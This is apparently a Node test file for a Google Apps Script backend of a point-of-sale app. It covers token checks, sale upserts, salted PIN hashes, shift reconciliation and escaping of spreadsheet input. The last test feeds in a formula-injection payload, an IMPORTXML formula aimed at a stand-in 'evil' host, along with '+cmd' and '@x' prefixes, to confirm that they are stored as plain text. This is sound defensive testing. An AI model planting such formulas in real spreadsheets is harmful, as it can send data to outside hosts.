// Runs apps-script/Code.gs against a tiny in-memory fake of SpreadsheetApp to check upserts, auth and users.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { createHash, randomUUID } from 'node:crypto';
import { hashPin } from '../js/logic.js';

function fakeSheet(name) {
  const rows = [];
  const range = (r, c, nr = 1, nc = 1) => ({
    setValues(v) { v.forEach((row, i) => { rows[r - 1 + i] = rows[r - 1 + i] || []; row.forEach((x, j) => { rows[r - 1 + i][c - 1 + j] = x; }); }); return this; },
    getValues() { return Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => (rows[r - 1 + i] || [])[c - 1 + j] ?? '')); },
    setFontWeight() { return this; }, setBackground() { return this; }, setNumberFormat() { return this; },
    setFormula(f) { rows[r - 1] = [f]; return this; }
  });
  return {
    name, rows,
    getRange(a, b, c, d) { return typeof a === 'string' ? range(1, 1) : range(a, b, c, d); },
    getLastRow() { return rows.length; },
    appendRow(r) { rows.push(r); },
    setFrozenRows() {}, setRightToLeft() {}, setConditionalFormatRules() {}
  };
}

function load() {
  const sheets = {};
  const ss = {
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => (sheets[n] = fakeSheet(n)),
    getSheets: () => Object.values(sheets),
    deleteSheet: () => {}
  };
  const props = {};
  const rule = { whenNumberLessThan() { return this; }, whenNumberGreaterThan() { return this; }, whenNumberEqualTo() { return this; }, setBackground() { return this; }, setRanges() { return this; }, build() { return {}; } };
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss, newConditionalFormatRule: () => ({ ...rule }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] ?? null, setProperty: (k, v) => { props[k] = v; } }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (t) => ({ text: t, setMimeType() { return this; } }) },
    Utilities: {
      getUuid: () => randomUUID(),
      DigestAlgorithm: { SHA_256: 'sha256' }, Charset: { UTF_8: 'utf8' },
      computeDigest: (_a, s) => [...createHash('sha256').update(s, 'utf8').digest()].map((b) => (b > 127 ? b - 256 : b))
    },
    JSON, Math, Number, String, Date, Object
  };
  vm.createContext(ctx);
  vm.runInContext(readFileSync(new URL('../apps-script/Code.gs', import.meta.url), 'utf8'), ctx);
  ctx.setup();
  const call = (body) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  return { sheets, props, call };
}

const sale = (voided = 0) => ({
  receiptId: 'T1-261105-0001', shiftId: 'T1-SH-0001', cashierName: 'سارا', timestamp: '2026-11-05T10:00:00Z',
  items: [{ barcode: '012000000133', name: 'پپسی', qty: 3, price: 4000, cost: 2500 }], total: 12000, cashReceived: 20000, changeGiven: 8000, voided
});

test('rejects wrong token', () => {
  const { call } = load();
  assert.equal(call({ action: 'push', token: 'nope' }).ok, false);
});

test('push writes AFN values, and re-push / void updates instead of duplicating', () => {
  const { sheets, props, call } = load();
  const token = props.SYNC_TOKEN;
  assert.equal(call({ action: 'push', token, deviceId: 'T1', sales: [sale()], products: [{ barcode: '012000000133', name: 'پپسی', price: 4000, cost: 2500, stock: 21 }] }).ok, true);
  assert.equal(call({ action: 'push', token, deviceId: 'T1', sales: [sale(1)] }).ok, true);
  const s = sheets.Sales.rows;
  assert.equal(s.length, 2); // header + one receipt
  assert.equal(s[1][4], 120);  // total in AFN
  assert.equal(s[1][9], 'Voided');
  assert.equal(s[1][13], 0);   // no profit on voided
  assert.equal(sheets.Sale_Items.rows.length, 2);
  assert.equal(sheets.Inventory.rows[1][0], '012000000133');
  assert.equal(sheets.Inventory.rows[1][5], 38); // margin %
});

test('users endpoint returns salted hashes that the app can verify; skips bad PINs', async () => {
  const { sheets, props, call } = load();
  sheets.Users.rows.length = 1;
  sheets.Users.rows.push(['مریم', 'مدیر', '4321', true], ['بد', 'cashier', '12', true], ['علی', 'cashier', '5555', 'FALSE']);
  const res = call({ action: 'users', token: props.SYNC_TOKEN });
  assert.equal(res.users.length, 2);
  const [m, a] = res.users;
  assert.equal(m.role, 'admin');
  assert.equal(await hashPin('4321', m.salt), m.pinHash);
  assert.equal(a.active, false);
  assert.ok(!JSON.stringify(res).includes('4321'));
});

test('shift reconciliation status', () => {
  const { sheets, props, call } = load();
  call({ action: 'push', token: props.SYNC_TOKEN, shifts: [{ shiftId: 'SH1', status: 'closed', cashierName: 'x', variance: -1000, expectedCash: 152000, countedCash: 151000, startingFloat: 150000, netCash: 12000, payins: 0, payouts: 0, drops: 10000, txCount: 1 }] });
  const r = sheets.Shift_Reconciliation.rows[1];
  assert.equal(r[11], -10);
  assert.equal(r[12], 'Short');
});

test('text that looks like a spreadsheet formula is written as plain text', () => {
  const { sheets, props, call } = load();
  call({ action: 'push', token: props.SYNC_TOKEN, products: [{ barcode: '9', name: '=IMPORTXML("http://evil","//a")', price: 100, cost: 0, stock: 1 }],
    movements: [{ id: 'm1', type: 'payout', amount: 100, note: '+cmd', userName: '@x', approvedBy: 'a' }] });
  assert.equal(sheets.Inventory.rows[1][1], "'=IMPORTXML(\"http://evil\",\"//a\")");
  assert.equal(sheets.Cash_Movements.rows[1][5], "'+cmd");
  assert.equal(sheets.Cash_Movements.rows[1][6], "'@x");
  assert.equal(sheets.Cash_Movements.rows[1][4], 1); // numbers untouched
});
